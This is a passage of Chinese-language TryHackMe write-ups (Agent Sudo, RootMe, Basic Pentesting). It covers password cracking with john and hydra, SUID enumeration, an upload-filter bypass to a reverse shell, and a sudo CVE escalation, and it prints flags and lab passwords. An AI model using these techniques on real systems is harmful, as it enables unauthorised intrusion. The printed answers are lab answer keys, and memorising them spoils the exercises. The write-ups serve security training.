<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk -e cutie.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced</span><br><span class="line">869           0x365           Zlib compressed data, best compression</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt</span><br><span class="line">34820         0x8804          End of Zip archive, footer length: 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分离开后确实有密码，开始爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/_cutie.png.extracted]</span><br><span class="line">└─$ john hash                                             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])</span><br><span class="line">Cost 1 (HMAC size) is 78 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">alien            (8702.zip/To_agentR.txt)     </span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2024-03-05 01:33) 1.315g/s 58478p/s 58478c/s 58478C/s 123456..Peter</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alien</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>steg password</p>
<p>解压上述压缩包后我们得到一段信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Agent C,</span><br><span class="line">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br><span class="line">By,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
<p>base64后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Area51</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Who is the other agent (in full name)?</p>
<p>从cute-alien.jpg中提取数据，然后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi james,</span><br><span class="line"></span><br><span class="line">Glad you find this message. Your login password is hackerrules!</span><br><span class="line"></span><br><span class="line">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br><span class="line"></span><br><span class="line">Your buddy,</span><br><span class="line">chris</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SSH password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerrules</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Capture-the-user-flag">Capture the user flag</h3>
<ol>
<li>
<p>What is the user flag?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ^[[200~ssh james@10.10.212.207   ~</span><br><span class="line">zsh: bad pattern: ^[[200~ssh</span><br><span class="line">                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh james@10.10.212.207   </span><br><span class="line">The authenticity of host &#x27;10.10.212.207 (10.10.212.207)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:1: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.212.207&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">james@10.10.212.207&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">75 packages can be updated.</span><br><span class="line">33 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct 29 14:26:27 2019</span><br><span class="line">james@agent-sudo:~$ ls</span><br><span class="line">Alien_autospy.jpg  user_flag.txt</span><br><span class="line">james@agent-sudo:~$ cat user_flag.txt </span><br><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
<p>因此可以得到本题的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What is the incident of the photo called?</p>
<p>在该文件下还发现存在一个图片，传输至本地查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo scp james@10.10.212.207:Alien_autospy.jpg ~/</span><br></pre></td></tr></table></figure>
<p>尝试传输发现权限不足</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, user james is not allowed to execute &#x27;/usr/bin/scp james@10.10.212.207:Alien_autospy.jpg /home/james/&#x27; as root on agent-sudo.</span><br></pre></td></tr></table></figure>
<p>枚举一下权限组信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james@agent-sudo:~$ sudo -l</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Matching Defaults entries for james on agent-sudo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on agent-sudo:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提权步骤看下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Roswell alien autopsy</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Privilege-escalation">Privilege escalation</h3>
<ol>
<li>
<p>CVE number for the escalation</p>
<p>查询关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>
<p>发现存在漏洞<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-14287</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What is the root flag?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@agent-sudo:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@agent-sudo:/root# cat root.txt </span><br><span class="line">To Mr.hacker,</span><br><span class="line"></span><br><span class="line">Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. </span><br><span class="line"></span><br><span class="line">Your flag is </span><br><span class="line">b53a02f55b57d4439e3341834d70c062</span><br><span class="line"></span><br><span class="line">By,</span><br><span class="line">DesKel a.k.a Agent R</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>(Bonus) Who is Agent R?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DesKel</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://s2.loli.net/2024/03/05/vhJLdnYr8VDmCqj.png" alt="Tryhackme_5_4"></p>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme-easy-RootMe</title>
    <url>/2024/03/13/Tryhackme-easy-RootMe/</url>
    <content><![CDATA[<h1>Tryhackme-easy-RootMe</h1>
<h2 id="靶场：RootMe">靶场：RootMe</h2>
<h3 id="Reconnaissance">Reconnaissance</h3>
<ol>
<li>
<p>Scan the machine, how many ports are open?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>
<p>nmap扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─$ nmap -sV 10.10.24.147                </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 03:47 EST</span><br><span class="line">Nmap scan report for 10.10.24.147 (10.10.24.147)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 39.87 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What version of Apache is running?</p>
<p>根据上述扫描结果得出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.4.29</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What service is running on port 22?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find directories on the web server using the GoBuster tool</p>
<p><img src="https://s2.loli.net/2024/02/27/JAeXCag7i4V6nPt.png" alt="Tryhackme_4_1"></p>
</li>
<li>
<p>What is the hidden directory?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/panel/</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Getting-a-shell">Getting a shell</h3>
<p>在上面找到相关路径之后，是一个文件上传的入口，同时还有一个uploads，是上传文件的存放地址</p>
<p><img src="https://s2.loli.net/2024/02/27/CNL5VpRXo1xe3dy.png" alt="Tryhackme_4_2"></p>
<p>经测试仅对后缀名进行了过滤</p>
<p>通过后缀名加数字成功绕过，但是直接使用正向的连接失效，可能是禁了进口的流量，开始反弹shell</p>
<p>不知道什么缘故，kali虚拟机一直接受不到shell，主机上成功弹出来了，卡了好久，不知道什么原因（</p>
<p><img src="https://s2.loli.net/2024/02/27/DpksGFN39Htuigq.png" alt="Tryhackme_4_3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd var/www</span><br><span class="line">$ ls</span><br><span class="line">html</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>第一个shell的位置</p>
<h3 id="Privilege-escalation">Privilege escalation</h3>
<p>到了提权的位置。第一个提示说SUID提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
<p>得到以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/python</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/snap/core/8268/bin/mount</span><br><span class="line">/snap/core/8268/bin/ping</span><br><span class="line">/snap/core/8268/bin/ping6</span><br><span class="line">/snap/core/8268/bin/su</span><br><span class="line">/snap/core/8268/bin/umount</span><br><span class="line">/snap/core/8268/usr/bin/chfn</span><br><span class="line">/snap/core/8268/usr/bin/chsh</span><br><span class="line">/snap/core/8268/usr/bin/gpasswd</span><br><span class="line">/snap/core/8268/usr/bin/newgrp</span><br><span class="line">/snap/core/8268/usr/bin/passwd</span><br><span class="line">/snap/core/8268/usr/bin/sudo</span><br><span class="line">/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/8268/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/8268/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/8268/usr/sbin/pppd</span><br><span class="line">/snap/core/9665/bin/mount</span><br><span class="line">/snap/core/9665/bin/ping</span><br><span class="line">/snap/core/9665/bin/ping6</span><br><span class="line">/snap/core/9665/bin/su</span><br><span class="line">/snap/core/9665/bin/umount</span><br><span class="line">/snap/core/9665/usr/bin/chfn</span><br><span class="line">/snap/core/9665/usr/bin/chsh</span><br><span class="line">/snap/core/9665/usr/bin/gpasswd</span><br><span class="line">/snap/core/9665/usr/bin/newgrp</span><br><span class="line">/snap/core/9665/usr/bin/passwd</span><br><span class="line">/snap/core/9665/usr/bin/sudo</span><br><span class="line">/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/9665/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/9665/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/9665/usr/sbin/pppd</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br></pre></td></tr></table></figure>
<p>这是靶机上的信息，我们需要找到异常，此此时尝试在自己主机上使用相同命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/kismet_cap_hak5_wifi_coconut</span><br><span class="line">/usr/bin/kismet_cap_linux_bluetooth</span><br><span class="line">/usr/bin/netkit-rsh</span><br><span class="line">/usr/bin/ntfs-3g</span><br><span class="line">/usr/bin/kismet_cap_nxp_kw41z</span><br><span class="line">/usr/bin/kismet_cap_linux_wifi</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/kismet_cap_rz_killerbee</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/netkit-rcp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/kismet_cap_ti_cc_2540</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/kismet_cap_ti_cc_2531</span><br><span class="line">/usr/bin/kismet_cap_nrf_51822</span><br><span class="line">/usr/bin/kismet_cap_ubertooth_one</span><br><span class="line">/usr/bin/kismet_cap_nrf_52840</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/kismet_cap_nrf_mousejack</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/netkit-rlogin</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/mount.cifs</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现/usr/bin/python不应该存在</p>
<p><a href="https://gtfobins.github.io/gtfobins/python/#suid">python | GTFOBins</a></p>
<p>在这里找到相关的提权方式</p>
<p><img src="https://s2.loli.net/2024/02/27/tPw5OLoF8iXcBaA.png" alt="Tryhackme_4_4"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme-easy-Basic Pentesting</title>
    <url>/2024/03/13/Tryhackme-easy-Basic%20Pentesting/</url>
    <content><![CDATA[<h1>Tryhackme-easy-Basic Pentesting</h1>
<h2 id="Basic-Pentesting">Basic Pentesting</h2>
<h3 id="Web-App-Testing-and-Privilege-Escalation">Web App Testing and Privilege Escalation</h3>
<p>先进行信息搜集，看端口，找目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ nmap -sV -sC -T4 10.10.233.69</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:01 EDT</span><br><span class="line">Nmap scan report for 10.10.233.69</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line">Not shown: 955 closed tcp ports (conn-refused), 39 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)</span><br><span class="line">|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)</span><br><span class="line">|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span><br><span class="line">| ajp-methods: </span><br><span class="line">|_  Supported methods: GET HEAD POST OPTIONS</span><br><span class="line">8080/tcp open  http        Apache Tomcat 9.0.7</span><br><span class="line">|_http-title: Apache Tomcat/9.0.7</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: basic2</span><br><span class="line">|   NetBIOS computer name: BASIC2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: basic2</span><br><span class="line">|_  System time: 2024-03-11T07:02:44-04:00</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-03-11T11:02:44</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 73.19 seconds</span><br></pre></td></tr></table></figure>
<p>扫描过程中，估计是网络问题，dirsearch一直崩，但是好歹是扫描出来一个异常目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u 10.10.233.69 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3 </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                         </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/_10.10.233.69/_24-03-11_06-57-34.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.10.233.69/</span><br><span class="line"></span><br><span class="line">[06:57:34] Starting:                                                                                    </span><br><span class="line">[06:57:50] 403 -  298B  - /.ht_wsr.txt                                      </span><br><span class="line">[06:57:50] 403 -  301B  - /.htaccess.bak1                                   </span><br><span class="line">[06:57:50] 403 -  301B  - /.htaccess.orig</span><br><span class="line">[06:57:51] 403 -  302B  - /.htaccess_extra                                  </span><br><span class="line">[06:57:51] 403 -  303B  - /.htaccess.sample</span><br><span class="line">[06:57:51] 403 -  301B  - /.htaccess_orig</span><br><span class="line">[06:57:51] 403 -  299B  - /.htaccessBAK</span><br><span class="line">[06:57:51] 403 -  299B  - /.htaccess_sc</span><br><span class="line">[06:57:51] 403 -  292B  - /.html</span><br><span class="line">[06:57:51] 403 -  301B  - /.htaccess.save                                   </span><br><span class="line">[06:57:51] 403 -  298B  - /.httr-oauth                                      </span><br><span class="line">[06:57:51] 403 -  297B  - /.htpasswds</span><br><span class="line">[06:57:51] 403 -  301B  - /.htpasswd_test                                   </span><br><span class="line">[06:57:51] 403 -  300B  - /.htaccessOLD2                                    </span><br><span class="line">[06:57:51] 403 -  291B  - /.htm</span><br><span class="line">[06:57:52] 403 -  299B  - /.htaccessOLD</span><br><span class="line">[06:58:48] 200 -  476B  - /development/       </span><br></pre></td></tr></table></figure>
<p>提交的隐藏目录也是正确的</p>
<p>访问development目录，找到两个文件</p>
<p>dev.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2018-04-23: I&#x27;ve been messing with that struts stuff, and it&#x27;s pretty cool! I think it might be neat</span><br><span class="line">to host that on this server too. Haven&#x27;t made any real web apps yet, but I have tried that example</span><br><span class="line">you get to show off how it works (and it&#x27;s the REST version of the example!). Oh, and right now I&#x27;m </span><br><span class="line">using version 2.5.12, because other versions were giving me trouble. -K</span><br><span class="line"></span><br><span class="line">2018-04-22: SMB has been configured. -K</span><br><span class="line"></span><br><span class="line">2018-04-21: I got Apache set up. Will put in our content later. -J</span><br></pre></td></tr></table></figure>
<p>j.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For J:</span><br><span class="line"></span><br><span class="line">I&#x27;ve been auditing the contents of /etc/shadow to make sure we don&#x27;t have any weak credentials,</span><br><span class="line">and I was able to crack your hash really easily. You know our password policy, so please follow</span><br><span class="line">it? Change that password ASAP.</span><br><span class="line"></span><br><span class="line">-K</span><br></pre></td></tr></table></figure>
<p>在查阅过程中，发现存在一个SMB枚举工具enum4linux，但是反复尝试了几次，都未能成功枚举出用户</p>
<p>奇了个怪了，每次扫描的结果还不一样，当然，我估计大概率还是网络问题</p>
<p>确实是，换了个欧洲节点快了不少，我自己的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Attempting to map shares on 10.10.233.69                                                            </span><br><span class="line">//10.10.233.69/Anonymous        Mapping: OK Listing: OK Writing: N/A  </span><br></pre></td></tr></table></figure>
<p>从这条信息中，已经可以看出存在匿名登录，但是应该可以直接扫出需要的用户名，不知道为什么没有（</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //10.10.233.69/anonymous</span><br></pre></td></tr></table></figure>
<p>成功登录上，发现存在staff.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cat staff.txt </span><br><span class="line">Announcement to staff:</span><br><span class="line"></span><br><span class="line">PLEASE do not upload non-work-related items to this share. I know it&#x27;s all in fun, but</span><br><span class="line">this is how mistakes happen. (This means you too, Jan!)</span><br><span class="line"></span><br><span class="line">-Kay</span><br></pre></td></tr></table></figure>
<p>然后开始爆破账户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.82.249 ssh</span><br></pre></td></tr></table></figure>
<p>出现了小小的问题，网络原因导致我这边爆破几乎无用，这一步只能暂时省略一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">armando</span><br></pre></td></tr></table></figure>
<p>登录账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jan@10.10.82.249</span><br></pre></td></tr></table></figure>
<p>得到立足点之后，开始思考提权</p>
<p>在当前目录下无有价值信息，发现还存在另一个登录用户目录kay，但是权限不足，无法查看pass.bak</p>
<p>开始进行枚举，查找相关提权思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jan@basic2:/home/kay$ ls -a</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bashrc  .cache  .lesshst  .nano  pass.bak  .profile  .ssh  .sudo_as_admin_successful  .viminfo</span><br></pre></td></tr></table></figure>
<p>发现存在ssh文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jan@basic2:/home/kay$ ls -la ./.ssh</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .</span><br><span class="line">drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..</span><br><span class="line">-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys</span><br><span class="line">-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa</span><br><span class="line">-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>有rsa密钥文件，复制下来保存到一个文件中，尝试破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ vim idrsa       </span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh2john idrsa &gt; idrsahash</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ john idrsahash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">beeswax          (idrsa)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-03-12 04:54) 50.00g/s 4137Kp/s 4137Kc/s 4137KC/s behlat..bammer</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
<p>成功破解出密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa kay@10.10.82.249</span><br></pre></td></tr></table></figure>
<p>然后开始读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat pass.bak</span><br><span class="line">heresareallystrongpasswordthatfollowsthepasswordpolicy$$</span><br></pre></td></tr></table></figure>
<h3 id="Answer">Answer</h3>
<ol>
<li>
<p>Deploy the machine and connect to our network</p>
</li>
<li>
<p>Find the services exposed by the machine</p>
</li>
<li>
<p>What is the name of the hidden directory on the web server(enter name without /)?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">development</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>User brute-forcing to find the username &amp; password</p>
</li>
<li>
<p>What is the username?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jan</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What is the password?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">armando</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What service do you use to access the server(answer in abbreviation in all caps)?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Enumerate the machine to find any vectors for privilege escalation</p>
</li>
<li>
<p>What is the name of the other user you found(all lower case)?</p>
